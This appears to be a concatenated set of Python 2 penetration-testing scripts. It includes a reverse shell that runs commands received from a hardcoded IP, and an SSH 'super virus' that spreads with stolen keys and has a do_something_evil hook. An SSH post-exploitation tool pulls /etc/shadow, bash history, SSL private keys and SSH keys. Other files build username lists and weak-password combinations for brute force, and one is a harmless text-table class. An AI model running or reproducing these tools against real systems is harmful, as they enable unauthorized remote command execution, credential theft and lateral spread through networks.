asyncore.loop()
########NEW FILE########
__FILENAME__ = shell
#!/usr/bin/env python
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this 
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice, 
#  this list of conditions and the following disclaimer in the documentation 
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

import subprocess
import socket
import sys
import argparse

HOST = '10.230.229.27'
PORT = '4445'

#Parse command line arguments using argparse
parser = argparse.ArgumentParser(description="Create a reverse shell.")
parser.add_argument('-s', action='store', default=HOST, metavar='server',
                    help='IP address of server accepting reverse connection')
parser.add_argument('-p', action='store', default=PORT, metavar='port',
                    help='Listening port on server.')
args = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((args.s, int(args.p)))
sock.send("[*] Connection recieved.")

while True:
	data = sock.recv(1024).strip()
	if data == 'quit': break
	proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, 
							stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	sock.send(proc.stdout.read())

########NEW FILE########
__FILENAME__ = ssh_pwn
#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#   Redistributions of source code must retain the above copyright notice, this
#   list of conditions and the following disclaimer.
#
#   Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   Neither the name of AverageSecurityGuy nor the names of its contributors may
#   be used to endorse or promote products derived from this software without
#   specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.

import os
import re


class ssh:

    def __init__(self, user, key, host):
        self.__user = user
        self.__key = key
        self.__host = host

        # Can we authenticate successfully?
        if self.run_ssh_command('ls') is None:
            self.authenticated = False
        else:
            self.authenticated = True

        # Can we sudo?
        if self.run_ssh_command('sudo ls') is None:
            self.sudo = False
        else:
            self.sudo = True

    def run_ssh_command(self, command, admin=False):
        '''
        Run the specified command. If there is an error return None. If not,
        return the response.
        '''
        if admin is True and self.__user != 'root':
            if self.sudo is True:
                command = 'sudo ' + command
            else:
                print '[-] Admin command failed, user is not root and cannot sudo.'
                return None

        cmd = 'ssh -i {0} {1}@{2} "{3}"'.format(self.__key,
                self.__user, self.__host, command)

        output = os.popen4(cmd)
        resp = output[1].read()

        # Check for common errors and return None
        if resp.find('Permission denied') != -1:
            return None
        if resp.find('not a regular file') != -1:
            return None
        if resp.find('Please login as the user') != -1:
            return None
        if resp.find('Could not resolve hostname') != -1:
            return None
        if resp.find('usage: ssh') != -1:
            return None
        if resp.find('No such file or directory') != -1:
            return None

        # If no errors then return output of command
        return resp

    def __download_file(self, src, dst, admin=False):
        '''
        Download the src file and save it to disk as dst.
        '''
        print '[*] Downloading {0} from {1}'.format(src, self.__host)
        resp = self.run_ssh_command('cat {0}'.format(src), admin)

        if resp is None:
            print '[-] Unable to download file'
            return False
        else:
            dfile = open(dst, 'w')
            dfile.write(resp)
            dfile.close()
            print '[+] File successfully downloaded.'
            return True

    def get_users(self):
        '''
        Read and parse the /etc/passwd file to get new user accounts.
        '''
        print '[*] Getting additional users.'
        users = []
        resp = self.run_ssh_command('cat /etc/passwd')
        if resp is None:
            return []
        for line in resp.split('\n'):
            u = line.split(':')[0]
            users.append(u)

        return users

    def get_hosts(self):
        '''
        Read and parse the .ssh/known_hosts file to get new hosts.
        '''
        print '[*] Getting additional hosts.'
        hosts = []
        resp = self.run_ssh_command('cat .ssh/known_hosts')
        if resp is None:
            return []
        for line in resp.split('\n'):
            h = line.split(' ')[0]
            hosts.append(h)

        return hosts

    def get_shadow(self):
        '''
        Get the /etc/shadow file and save it to disk. Will only work if we
        are root or have sudo ability.
        '''
        print '[*] Getting shadow file from {0}.'.format(self.__host)
        dst = '{0}_shadow'.format(self.__host)
        self.__download_file('/etc/shadow', dst, True)

    def get_history(self):
        '''
        Get the .bash_history file and save it to disk.
        '''
        print '[*] Getting Bash history file from {0}.'.format(self.__host)
        dst = '{0}_{1}_history'.format(self.__host, self.__user)
        self.__download_file('.bash_history', dst, True)

    def get_ssl_keys(self):
        '''
        Download any private SSL keys. Look in the directory specified by
        OPENSSLDIR in the output of the 'openssl version -a' command. only
        download .crt and .key files. Requires root or sudo.
        '''
        print '[*] Getting SSL keys, if any, from {0}'.format(self.__host)
        ssldir = None
        resp = self.run_ssh_command('openssl version -a')
        if resp is not None:
            m = re.search(r'OPENSSLDIR: "(.*)"', resp)
            if m is not None:
                ssldir = m.group(1) + '/certs'
            else:
                print '[-] No SSL directory found.'

        if ssldir is not None:
            print '[+] Searching for SSL keys in {0}.'.format(ssldir)
            resp = self.run_ssh_command('ls {0}'.format(ssldir), True)
            if resp is not None:
                for line in resp.split('\n'):
                    if line.find('.crt') != -1 or line.find('.key') != -1:
                        src = ssldir + '/' + line
                        dst = '{0}_{1}'.format(self.__host, line)
                        self.__download_file(src, dst, True)
            else:
                print '[-] No SSL keys were found.'

    def get_ssh_keys(self):
        '''
        Download the SSH keys in the .ssh directory. Return the list of keys
        found.
        '''
        print '[*] Getting additional SSH keys from {0}'.format(self.__host)
        keys = []
        resp = self.run_ssh_command('ls .ssh')
        for line in resp.split('\n'):
            if line == 'authorized_keys':
                continue
            if line == 'known_hosts':
                continue
            if line == 'config':
                continue
            if line == '':
                continue
            src = '.ssh/{0}'.format(line)
            dst = '{0}_{1}_{2}_sshkey'.format(self.__host, self.__user,
                    line)
            if self.__download_file(src, dst) is True:
                keys.append(line)

        return keys


def audit_ssh(user, key, host):
    '''
    Audit an SSH server. Attempt to authenticate to the host using the user
    and key provided. Attempt to get SSH keys, shadow file, bash_history and
    SSL private keys. Also add new users and hosts if allowed.
    '''
    print '[*] Auditing {0}@{1} with {2}.'.format(user, host, key)
    server = ssh(user, key, host)
    if server.authenticated is True:
        keys.extend(server.get_ssh_keys())
        if add_users is True:
            add_new_users(server.get_users())
        if add_hosts is True:
            add_new_hosts(server.get_hosts())
        server.get_shadow()
        server.get_history()
        server.get_ssl_keys()
        run_post_exploitation(server)
    else:
        print '[-] Unable to login to server.'


def add_new_users(new_users):
    '''
    Add new users to the global users list unless already in the list.
    '''
    for user in new_users:
        if user in users:
            continue
        if user in default_users:
            continue
        if user == '':
            continue
        print '[+] Found new user {0}.'.format(user)
        users.append(user)


def add_new_hosts(new_hosts):
    '''
    Add new hosts to the global hosts list unless already in the list.
    '''
    for host in new_hosts:
        if host in hosts:
            continue
        if host == '':
            continue
        print '[+] Found new host {0}.'.format(host)
        hosts.append(host)


def run_post_exploitation(server):
    '''
    Run post exploitation commands on the server and capture the responses
    in the 'postexploit' file. Failed commands are attempted with sudo if the
    user is not root.
    '''
    print '[*] Running post exploitation commands.'
    pe = open('postexploit', 'w')
    for cmd in post_exploit:
        print '[*] Running command {0}.'.format(cmd)
        pe.write(cmd + '\n')
        resp = server.run_ssh_command(cmd)
        if resp is None:
            print '[-] Command failed trying with sudo.'
            resp = server.run_ssh_command(cmd, True)
            if resp is not None:
                print '[+] Command successful.'
                pe.write(resp + '\n')
            else:
                print '[-] Command unsuccessful.'
                pe.write('\n')
        else:
            print '[+] Command successful.'
            pe.write(resp + '\n')

    pe.close()


def load_keys():
    '''
    Load SSH keys from the current directory.
    '''
    keys = []
    print '[*] Loading SSH keys from current directory.'
    for file in os.listdir('.'):
        if file.endswith('.pub'):
            continue
        if file == 'users':
            continue
        if file == 'hosts':
            continue
        if file == 'postexploit':
            continue
        if file.endswith('_shadow'):
            continue
        if file.endswith('_sshkey'):
            continue
        if file.endswith('_history'):
            continue
        if file == os.path.basename(__file__):
            continue
        keys.append(file)

    return keys


def load_users():
    '''
    Load user accounts from the 'users' file.
    '''
    u = []
    print '[*] Loading user accounts.'
    for line in open('users', 'r'):
        if line == '\n':
            continue
        u.append(line.rstrip())

    return u


def save_users():
    '''
    Update the 'users' file with the newly discovered users if allowed.
    '''
    print '[*] Saving user accounts.'
    u = open('users', 'w')
    u.write('\n'.join(users))
    u.close()


def load_hosts():
    '''
    Load hostnames/IPs from the 'hosts' file.
    '''
    h = []
    print '[*] Loading hosts.'
    for line in open('hosts', 'r'):
        if line == '\n':
            continue
        h.append(line.rstrip())

    return h


def save_hosts():
    '''
    Update the 'hosts' file with newly discovered hosts, if allowed.
    '''
    print '[*] Saving hosts.'
    h = open('hosts', 'w')
    h.write('\n'.join(hosts))
    h.close()


# Main Program
if __name__ == '__main__':
    '''
    CONFIGURATION OPTIONS
    Auto adding users and hosts can cause you to audit users or hosts that
    are not in scope. By default these are set to False. If you don't care,
    then set them to True.

    post_exploit contains a list of commands to run on any SSH servers to
    which we have access.

    default_users is a list of default user accounts that will not be added
    to the list of users if found on a server.
    '''
    add_users = True
    add_hosts = True
    post_exploit = ['ls /home']
    default_users = ['daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp',
                     'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup',
                     'list', 'irc', 'gnats', 'nobody', 'libuuid', 'syslog',
                     'messagebus', 'whoopsie', 'landscape', 'sshd']

    users = load_users()
    hosts = load_hosts()
    keys = load_keys()

    print '[*] Starting SSH audit.'
    for key in keys:
        for user in users:
            for host in hosts:
                audit_ssh(user, key, host)

    if add_users is True:
        save_users()
    if add_hosts is True:
        save_hosts()

########NEW FILE########
__FILENAME__ = ssh_super_virus
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice,
#  this list of conditions and the following disclaimer in the documentation
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.

import os
import re

re_login = re.compile(r'Please login as the user "(.*)" rather than')


def run_ssh_command(user, key, host, command):
    '''
    Run the specified command on the host.
    '''

    cmd = 'ssh -i {0} {1}@{2} "{3}"'.format(key, user, host, command)

    output = os.popen4(cmd)
    resp = output[1].read()

    # Check for common errors and return None

    if resp.find('Permission denied') > -1:
        return None

    # If no errors then return output of command

    return resp


def do_something_evil(user, key, host):
    '''
    For penetration testers, this is called post exploitation and the list of
    commands that are run would yield data used for exploiting other machines
    on the network or for exfiltration. For Shaun and Tatu, this is where the
    SSH super virus does its dirty work :). It is left up to the user to add
    the appropriate commands to "steal, distort or destroy confidential data."
    '''

    evil_commands = []

    for cmd in evil_commands:
        resp = run_ssh_command(user, key, host, cmd)
        if resp is not None:
            print resp


def download_new_key(user, key, host, file):
    '''Use SCP to copy new key files from the remote server.'''

    print '[*] Attempting to download key {0}'.format(file)
    src = '{0}@{1}:.ssh/{2}'.format(user, host, file)
    dst = '{0}-{1}_{2}'.format(user, host, file)
    cmd = 'scp -i {0} {1} {2}'.format(key, src, dst)

    output = os.popen4(cmd)
    resp = output[1].read()

    # Check for common errors and return None

    if resp.find('not a regular file') > -1:
        print '[-] Unable to download key file {0}\n'.format(dst)

    # If no errors then key file was downloaded

    print '[+] New key file {0} downloaded.\n'.format(dst)
    if dst not in new_keys:
        new_keys.append(dst)


def login_with_key(user, key, host):
    '''
    Attempt to login to the SSH server at host with the user and key.
    '''

    print '[*] Attempting login to {0} with user {1} and key {2}'.format(host,
            user, key)
    resp = run_ssh_command(user, key, host, 'ls .ssh')

    if resp is None:
        print '[-] Login to {0}@{1} with key {2} failed\n'.format(user,
                host, key)
    else:
        m = re_login.search(resp)
        if m is not None:

            # Received a message stating we need to login as a different user.

            print '[-] Login to {0}@{1} with key {2} failed\n'.format(user,
                    host, key)
        else:
            print '[+] Login to {0}@{1} with key {2} succeeded'.format(user,
                    host, key)
            for line in resp.split('\n'):
                if line == 'authorized_keys':
                    continue
                if line == 'known_hosts':
                    continue
                if line == 'config':
                    continue
                if line == '':
                    continue
                download_new_key(user, key, host, line)
            do_something_evil(user, key, host)


def load_keys():
    '''
    Load the initial set of SSH keys from the current directory. Prefix the
    key filename with "username-" to use the specified username otherwise root
    will be used. I assume the username will start with [a-z] and contain only
    [a-z0-9_], if that is not the case, modify the regex at the top of the
    script. Files with the extension ".pub" will be ignored.
    '''

    keys = []
    print '[*] Loading SSH keys from current directory.'
    for file in os.listdir('.'):
        if file.endswith('.pub'):
            continue
        if file == 'users':
            continue
        if file == 'hosts':
            continue
        if file == os.path.basename(__file__):
            continue
        keys.append(file)

    return keys


def load_users():
    '''
    Load user accounts from a file called 'users' in the current directory.
    '''

    u = []
    print '[*] Loading user accounts.'
    for line in open('users', 'r'):
        if line == '\n':
            continue
        u.append(line.rstrip())

    return u


def load_hosts():
    '''
    Load hostnames/ips from a file called 'hosts' in the current directory.
    '''

    h = []
    print '[*] Loading hosts.'
    for line in open('hosts', 'r'):
        if line == '\n':
            continue
        h.append(line.rstrip())

    return h


if __name__ == '__main__':
    users = load_users()
    hosts = load_hosts()
    initial_keys = load_keys()
    new_keys = []

    print '[*] Testing loaded keys.'
    for key in initial_keys:
        for host in hosts:
            for user in users:
                login_with_key(user, key, host)

    print '[*] Testing discovered keys'
    while new_keys != []:
        key = new_keys.pop(0)
        for host in hosts:
            for user in users:
                login_with_key(user, key, host)

########NEW FILE########
__FILENAME__ = sw_ike
#!/usr/bin/env python

import sys
import subprocess

if len(sys.argv) != 2:
    print 'USAGE: sw_ike.py target_file'

for line in open(sys.argv[1], 'r'):
    target = line.strip()
    cmd = 'ike-scan {0} -A -id GroupVPN -Ppsk_{0}.txt'.format(target)
    subprocess.call(cmd)

########NEW FILE########
__FILENAME__ = texttable
# Copyright (c) 2012, Tenable Network Security
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without 
# modification, are permitted provided that the following conditions are met:
#
#    Redistributions of source code must retain the above copyright notice, 
#    this list of conditions and the following disclaimer.
#
#    Redistributions in binary form must reproduce the above copyright notice, 
#    this list of conditions and the following disclaimer in the documentation 
#    and/or other materials provided with the distribution.
#
#    Neither the name of the Tenable Network Security nor the names of its 
#    contributors may be used to endorse or promote products derived from this 
#    software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
# POSSIBILITY OF SUCH DAMAGE.

class TextTable():

    def __init__(self):
        self.pad = 2
        self.hr = '='
        self.cr = '-'
        self.header = ''
        self.__col_names = []
        self.__rows = []
        self.__col_widths = []
        self.__num_cols = 0
        self.__col_aligns = []

    
    def __set_num_cols(self, num_cols):
        if self.__num_cols == 0:
            self.__num_cols = num_cols
            
    
    def __set_col_align(self):
        for i in range(self.__num_cols):
            self.__col_aligns.append('<')
            

    def __col_check(self, num_cols):
        if num_cols == self.__num_cols:
            return True
        else:
            return False

            
    def __set_col_widths(self):
        for i in range(self.__num_cols):
            widths = [len(r[i]) for r in self.__rows]
            widths.append(len(self.__col_names[i]))
            self.__col_widths.append(max(widths))

            
    def add_col_align(self, aligns):
        if self.__col_check(len(aligns)):
            for align in aligns:
                if align in ['<', '^', '>']:
                    self.__col_aligns.append(align)
                else:
                    print 'Invalid alignment, using left alignment.'
                    self.__col_aligns.append('<')
        else:
            print 'Column number mismatch, column alignments not set.'
            

    def add_rows(self, rows):
        for row in rows:
            self.add_row(row)

            
    def add_row(self, row):
        self.__set_num_cols(len(row))
        
        if self.__col_check(len(row)):
            self.__rows.append([str(r) for r in row])
        else:
            print 'Column number mismatch, row was not added to the table.'
            
        
    def add_col_names(self, col_names):
        self.__set_num_cols(len(col_names))
            
        if self.__col_check(len(col_names)):
            self.__col_names = col_names
        else:
            print 'Column number mismatch, headings were not added to the table.'
            
           
    def __str__(self):
        self.__set_col_widths()
        if self.__col_aligns == []:
            self.__set_col_align()
        
        s = '\n'

        # Print the header if there is one
        if self.header:
            s += ' ' * self.pad + self.header + '\n'
            s += ' ' * self.pad + self.hr * len(self.header) + '\n'
            s += '\n'

        # Print the column headings if there are any
        if self.__col_names:
            head = ' ' * self.pad
            rule = ' ' * self.pad
            
            for i in range(self.__num_cols):
                width = self.__col_widths[i]
                align = self.__col_aligns[i]
                name = self.__col_names[i]
                head += '{0:{j}{w}} '.format(name, j=align, w=width)
                rule += '{0:{j}{w}} '.format(self.cr * width, j=align, w=width)

            s += head + '\n'
            s += rule + '\n'

        # Print the rows
        for row in self.__rows:
            rstr = ' ' * self.pad
            
            for i in range(self.__num_cols):
                width = self.__col_widths[i]
                align = self.__col_aligns[i]
                rstr += '{0:{j}{w}} '.format(row[i], j=align, w=width)
                                
            s += rstr + '\n'
        #s += '\n'
        
        return s

if __name__ == '__main__':

    t1 = TextTable()
    t1.header = 'A Table of Numbers'
    t1.add_col_names(['Col1', 'Col2', 'Col3', 'Col4'])
    t1.add_col_align(['<', '<', '^', '>'])
    rows = [[1, 2, 3, 4],
            [5, 6, 7, 8],
            [9, 10, 11, 12],
            [111111, 22222222, 3333333333, 444444444444]]
    t1.add_rows(rows)
    
    print t1
    
    t2 = TextTable()
    t2.header = 'Another Table of Numbers'
    t2.add_col_names(['Col1', 'Col2', 'Col3', 'Col4'])
    t2.add_row([1, 2, 3, 4])
    t2.add_row([5, 6, 7, 8])
    t2.add_row([9, 10, 11, 12])
    print t2
########NEW FILE########
__FILENAME__ = usernames
#!/usr/bin/python
#Copyright (C) 2011 Stephen Haywood aka Averagesecurityguy
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import sys

#------------------------------------------------------------------------------
# Main Program
#------------------------------------------------------------------------------
patterns = ['flast', 'firstl', 'first.last']

if len(sys.argv) != 4:
    print 'Usage: usernames.py firsts lasts pattern'
    print 'Valid patterns include {0}'.format(', '.join(patterns))
    sys.exit()

p = sys.argv[3]

if p not in patterns:
    print 'Pattern must be one of {0}'.format(', '.join(patterns))
    sys.exit()

for last in open(sys.argv[2]):
    last = last.rstrip('\r\n')
    for first in open(sys.argv[1]):
        first = first.rstrip('\r\n')
        if p == 'flast':
            print '{0}{1}'.format(first[0], last)
        if p == 'firstl':
            print '{0}{1}'.format(first, last[0])
        if p == 'first.last':
            print '{0}.{1}'.format(first, last)

########NEW FILE########
__FILENAME__ = weak_passwords
#!/usr/bin/env python
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice,
#  this list of conditions and the following disclaimer in the documentation
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.

import argparse

#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------


def list_from_file(filename):
    tmp = []
    try:
        f = open(filename, 'r')
    except:
        print "Could not open file: %s" % f.name()

    for line in f:
        tmp.append(line.rstrip('\r\n'))

    return tmp


def combos(word):
    adds = []

    adds.extend(['$', '123', '456', '789', '69', '6969', '89', '99', '1234'])
    adds.extend(['33', '44', '55', '66', '77', '88', '1977', '1978', '1979'])
    adds.extend(['1234', '4321', '007', '2112', '!', '@', '#', ])

    for i in xrange(0, 10):
        adds.append(str(i))
        adds.append("0" + str(i))

    for i in xrange(10, 23):
        adds.append(str(i))

    for i in xrange(1990, 2013):
        adds.append(str(i))

    tmp = []

    tmp.append(word)
    tmp.append(word + word)
    for a in adds:
        tmp.append(word + a)
        tmp.append(a + word)

    return tmp


def password_combos(plist):
    pwd = []
    for p in plist:
        pwd.extend(combos(p))
        pwd.extend(combos(p.capitalize()))

    return pwd

#------------------------------------------------------------------------------
# Main Program
#------------------------------------------------------------------------------

#Parse command line arguments using argparse
desc = """weak_passwords.py takes a username or userlist, a company name or
company list (optional) and a wordlist (optional) and creates username and
password combinations formatted for use in Metasploit. The script includes
some common passwords cited by Chris Gates (carnal0wnage) and Rob Fuller
(mubix) in their talk "The Dirty Little Secrets They Didn't Teach You In
Pentesting Class" presented at Derbycon 2011. The passwords are transformed
using some of the best64 rules from hashcat.
"""
parser = argparse.ArgumentParser(description=desc)
usergroup = parser.add_mutually_exclusive_group(required=True)
usergroup.add_argument('-u', action='store', default=None, metavar="USERS",
                    help='Comma delimited list of usernames')
usergroup.add_argument('-U', action='store', default=None, metavar="USERFILE",
                    help='File with list of Usernames.')
compgroup = parser.add_mutually_exclusive_group(required=False)
compgroup.add_argument('-c', action='store', default=None, metavar="COMPANIES",
                    help='Comma delimited list of company names')
compgroup.add_argument('-C', action='store', default=None, metavar="COMPANYFILE",
                    help='File with list of company names.')
wordgroup = parser.add_mutually_exclusive_group(required=False)
wordgroup.add_argument('-w', action='store', default=None, metavar="WORDS",
                    help='Comma delimited list of words')
wordgroup.add_argument('-W', action='store', default=None, metavar="WORDFILE",
                    help='File with list of words to transform.')

args = parser.parse_args()
users = []
comps = []
pwds = []
words = []

if args.u:
    users.extend(args.u.split(","))
if args.U:
    users = list_from_file(args.U)
if args.c:
    comps.extend(args.c.split(","))
if args.C:
    comps = list_from_file(args.C)
if args.w:
    words.extend(args.w.split(","))
if args.W:
    words = list_from_file(args.W)

words.extend ([ "password", "passw0rd", "p@ssword", "p@ssw0rd", "welcome",
                "welc0me", "w3lcome", "w3lc0me", "changeme", "winter", 
                "spring", "summer", "fall", "security", "123456", "12345678",
                "abc123", "qwerty", "monkey", "letmein", "dragon", "111111",
                "baseball", "iloveyou", "trustno1", "1234567", "sunshine",
                "master", "123123", "shadow", "shad0w", "ashley", "football",
                "f00tball", "footb@ll", "f00tb@ll", "jesus", "michael", 
                "ninja", "mustang"])

pwds.extend(password_combos(comps))
pwds.extend(password_combos(words))

for u in users:
    for p in pwds:
        print '%s %s' % (u, p)
    for p in password_combos([u]):
        print '%s %s' % (u, p)

########NEW FILE########
